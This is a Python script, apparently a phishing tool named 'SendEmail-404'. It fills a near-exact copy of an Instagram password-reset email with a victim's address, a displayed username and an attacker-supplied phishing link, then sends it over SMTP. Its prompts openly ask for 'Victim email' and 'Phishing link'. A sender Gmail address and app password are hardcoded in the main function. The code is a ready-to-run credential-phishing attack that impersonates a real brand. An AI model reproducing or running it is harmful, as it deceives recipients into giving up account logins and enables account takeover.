import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from colorama import Fore, Style, init
from pyfiglet import Figlet

init(autoreset=True)

# Banner
f = Figlet(font='slant')
print(Fore.CYAN + f.renderText('SendEmail-404') + Style.RESET_ALL)

# ===== قالب HTML مع متغيرات (لن يتم تغييرها يدوياً) =====
HTML_TEMPLATE = """
<tbody>
    <tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr><tr><td height="1" colspan="3" style="line-height:1px"></td></tr><tr><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse;text-align:center;width:100%"><tbody><tr><td width="15px" style="width:15px"></td><td style="line-height:0px;max-width:600px;padding:0 0 15px 0"><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="width:100%;text-align:left;height:33px"><a style="color:#1b74e4;text-decoration:none"><img height="33" src="https://ci3.googleusercontent.com/meips/ADKq_NYw892qVLU9BnuxJn-dcxUaDUKyo1l2rDymzFZkL4HjF55OHSOYa085v8z78rVMEqtqGHiwhJR1B0Z89F61LmDIi4OfYbjSzi9r-bfP3xp4k0A=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yb/r/QTa-gpOyYBa.png" style="border:0" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0."></a></td></tr></tbody></table></td><td width="15px" style="width:15px"></td></tr></tbody></table></td></tr><tr><td><table border="0" width="430" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto"><tbody><tr><td><table border="0" width="430px" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:430px"><tbody><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">
     Hi {username},</p><p style="margin:10px 0 10px 0;color:#565a5c;font-size:18px">Sorry to hear you’re having trouble logging into Instagram. We got a message that you forgot your password. If this was you, you can get right back into your account or reset your password now.</p></td></tr><tr></tr><tr><td height="20" style="line-height:20px">&nbsp;</td></tr><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><a href="{phishing_link}" style="color:#1b74e4;text-decoration:none;display:block;width:370px" target="_blank"><table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:initial"><tbody><tr><td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:0 2px 0 auto;min-width:80px;background-color:#47a2ea">
    <a href="{phishing_link}" style="color:#1b74e4;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px">
    Log&nbsp;in&nbsp;as&nbsp;{username}</span></font></center></a></td></tr></tbody></table></a></td></tr><tr><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td><table border="0" width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr></tr><tr><td height="20" style="line-height:20px">&nbsp;</td></tr><tr><td><a href="{phishing_link}" style="color:#1b74e4;text-decoration:none;display:block;width:370px" target="_blank"><table border="0" width="390" cellspacing="0" cellpadding="0" style="border-collapse:initial"><tbody><tr><td style="border-collapse:collapse;border-radius:3px;text-align:center;display:block;border:solid 1px #009fdf;padding:10px 16px 14px 16px;margin:0 2px 0 auto;min-width:80px;background-color:#47a2ea">
    <a href="{phishing_link}" style="color:#1b74e4;text-decoration:none;display:block" target="_blank"><center><font size="3"><span style="font-family:Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;white-space:nowrap;font-weight:bold;vertical-align:middle;color:#fdfdfd;font-size:16px;line-height:16px">Reset&nbsp;your&nbsp;password</span></font></center></a></td></tr></tbody></table></a></td></tr><tr><td height="20" style="line-height:20px">&nbsp;</td></tr><tr><td width="15" style="display:block;width:15px">&nbsp;&nbsp;&nbsp;</td></tr><tr></tr><tr><td><div><div style="padding:0;margin:10px 0 10px 0;color:#565a5c;font-size:16px">If you didn’t request a login link or a password reset, you can ignore this message and
    <a href="{phishing_link}" style="color:#1b74e4;text-decoration:none" target="_blank">learn more about why you may have received it</a>. <span></span><br><br>Only people who know your Instagram password or click the login link in this email can log into your account.</div></div></td></tr></tbody></table></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td><table border="0" cellspacing="0" cellpadding="0" style="border-collapse:collapse;margin:0 auto 0 auto;width:100%;max-width:600px"><tbody><tr><td height="4" style="line-height:4px" colspan="3">&nbsp;</td></tr><tr><td width="15px" style="width:15px"></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td style="text-align:center"><div style="padding-top:10px;display:flex"><div style="margin:auto"><img src="https://ci3.googleusercontent.com/meips/ADKq_NYoTUi7SEY9wvjstXqfwd0DN7KDE70b_uYNb1nRuwnSMFFAJjbEUa26e0hQwTStMYzlV0zYT8wYHrdl3f0XqIRoLbXHeNKSGh1HcMuJIKM1ix4=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yW/r/EK_fa82Ffa5.png" height="26" width="52" alt="" class="CToWUd" data-bit="iit" jslog="138226; u014N:xr6bB; 53:WzAsMl0."></div><br></div><div style="height:10px"></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">© Instagram. Meta Platforms, Inc., 1601 Willow Road, Menlo Park, CA 94025, États-Unis<br></div><div style="color:#abadae;font-size:11px;margin:0 auto 5px auto">Ce message a été envoyé à
    <a style="color:rgb(151,151,151);text-decoration:underline;max-width:600px">{victim_email}</a> et était destiné à c. Ce n’est pas votre compte&nbsp;?
    <a href="{phishing_link}" style="color:rgb(151,151,151);text-decoration:underline;max-width:600px" target="_blank">Supprimez votre e-mail</a> de ce compte.<br></div></td><td width="20" style="display:block;width:20px">&nbsp;&nbsp;&nbsp;</td><td width="15px" style="width:15px"></td></tr><tr><td height="32" style="line-height:32px" colspan="3">&nbsp;</td></tr></tbody></table></td></tr><tr><td height="20" style="line-height:20px" colspan="3">&nbsp;</td></tr></tbody>
"""

# ===== إعدادات SMTP التلقائية =====
SMTP_CONFIGS = {
    'gmail.com': ('smtp.gmail.com', 587),
    'googlemail.com': ('smtp.gmail.com', 587),
    'outlook.com': ('smtp.office365.com', 587),
    'hotmail.com': ('smtp.office365.com', 587),
    'live.com': ('smtp.office365.com', 587),
    'office365.com': ('smtp.office365.com', 587),
    'yahoo.com': ('smtp.mail.yahoo.com', 587),
    'yahoo.fr': ('smtp.mail.yahoo.com', 587),
    'icloud.com': ('smtp.mail.me.com', 587),
    'mail.com': ('smtp.mail.com', 587),
    'protonmail.com': ('mail.protonmail.ch', 587),
    'zoho.com': ('smtp.zoho.com', 587),
}

def get_smtp(email):
    domain = email.split('@')[-1].lower()
    return SMTP_CONFIGS.get(domain, ('smtp.gmail.com', 587))

def send_email(sender, password, recipient, subject, html):
    server, port = get_smtp(sender)
    print(f"[*] SMTP: {server}:{port}")

    msg = MIMEMultipart('alternative')
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(html, 'html'))

    try:
        with smtplib.SMTP(server, port) as smtp:
            smtp.starttls()
            smtp.login(sender, password)
            smtp.sendmail(sender, recipient, msg.as_string())
        print(f"[✓] Sent to {recipient}")
        return True
    except Exception as e:
        print(f"[✗] Error: {e}")
        return False

def main():
    # بيانات المرسل (يمكن تغييرها)
    ATTACKER_EMAIL = "instagram88sicurity@gmail.com"
    APP_PASSWORD = "ovypaspbsgadtzjk"   # كلمة مرور التطبيق

    victim = input("Victim email: ").strip()
    username = input("Username to appear: ").strip()
    link = input("Phishing link: ").strip()

    subject = input("Subject (default: Reset your Instagram password): ").strip()
    if not subject:
        subject = "Reset your Instagram password"

    if not all([victim, username, link]):
        print("[!] All fields are required.")
        return

    # تعبئة القالب
    html = HTML_TEMPLATE.format(
        username=username,
        phishing_link=link,
        victim_email=victim
    )

    send_email(ATTACKER_EMAIL, APP_PASSWORD, victim, subject, html)

if __name__ == "__main__":
    main()
